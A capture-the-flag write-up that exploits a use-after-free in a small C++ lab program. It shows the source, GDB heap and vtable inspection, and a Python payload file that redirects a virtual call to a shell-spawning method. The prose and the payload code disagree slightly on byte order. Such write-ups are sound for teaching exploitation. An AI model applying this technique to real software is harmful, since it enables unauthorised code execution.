### Analysis

The program uaf.cpp has a simple switch that creates two objects (Man and Woman), which call methods from their respective vtables. It also reads a file of our choice and allocates that data. The program provides control over which function to call via a switch case.

```C
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```

We want to call the give_shell() method instead of introduce().

Using GEF (GDB Enhanced Features), we can analyze the binary. After disassembling the main function, we find that before the creation of an object, a new heap chunk is created.
 
```bash
   0x0000000000400f00 <+60>:    call   0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f05 <+65>:    mov    rbx,rax
   0x0000000000400f08 <+68>:    mov    edx,0x19
   0x0000000000400f0d <+73>:    mov    rsi,r12
   0x0000000000400f10 <+76>:    mov    rdi,rbx
   0x0000000000400f13 <+79>:    call   0x401264 <Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)> 
```

If we set a breakpoint after calling the `Man()` constructor, we can use `heap chunks` to inspect them.

```bash
Chunk(addr=0x6152e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006152e0     70 15 40 00 00 00 00 00 19 00 00 00 00 00 00 00    p.@.............]
```

This tells us, that we have created a heap chunk on address `0x6152e0`, with size `0x20` (32, size passed to `new()` was 18 but due to 8 or 16 byte alingment (based on system) it grows to 32)

We can examine the chunk using `x/xg 0x6152e0` and see the address to vtable. 

```bash
gef➤  x/4xg 0x0000000000401570
0x401570 <vtable for Man+16>:   0x000000000040117a      0x00000000004012d2
0x401580 <vtable for Human>:    0x0000000000000000      0x00000000004015f0
```

The two addresses in the vtable are for the methods `give_shell()` and `introduce()`. We can examine them to confirm this.

```bash
gef➤  x/xg 0x000000000040117a
0x40117a <Human::give_shell()>: 0x10ec8348e5894855
```

After using the program with the third option (delete), we can examine the chunk again and see that the vtable address is erased, but the vtable itself still contains addresses to the virtual functions. 
We can also use `heap bins` to see freed chunks and their sizes.

```bash
gef➤  heap bins
──────────────────────────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x615330, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x6152e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
Tcachebins[idx=1, size=0x30, count=2] ←  Chunk(addr=0x615300, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x6152b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 

```

### Exploit

If the freed chunks are the same size as the new data we want to allocate, our heap manager will reuse those old heap chunks. Using this behavior, we can use option `2` to allocate a `data` array with a size of `0x18` (24 bytes, the same size as our previous data). This allocation will overwrite the `Man` and `Woman` chunks. After this, we can use option `1` to call the `introduce()` method; however, due to the overwritten vtable, it will incorrectly call `give_shell()` instead.

If we create a file containing 24 characters and use it as an argument file for our program, we can see that `heap chunks` are reused by using options `3` and then `2`. This shows that our heap chunks were reused.

Additionally, we need to reuse the `Woman` chunk to prevent our program from segfaulting. To achieve this, we simply need to use option `2` twice, allowing us to allocate two objects.

The last piece of the puzzle is understanding how `m->introduce()` works. It first accesses the vtable address, which points to two addresses, and then calls `(*vtable) + 8`. To call `give_shell()` instead of `introduce()`, we set `vtable_address` to `vtable_address - 8`, which is `0x0000000000401568`.

This python code will write our exploit, that has 16 characters followed by address of our function address.

```Python
with open("./tmp", "wb") as f:
    f.write(b'\x68\x15\x40\x00\x00\x00\x00\x00\x00' + 16* b'Y' )
```

After running this script, we can call:

```bash
./uaf 24 tmp
```
and then use options `3`, `2`, `2`, `1` to access shell.
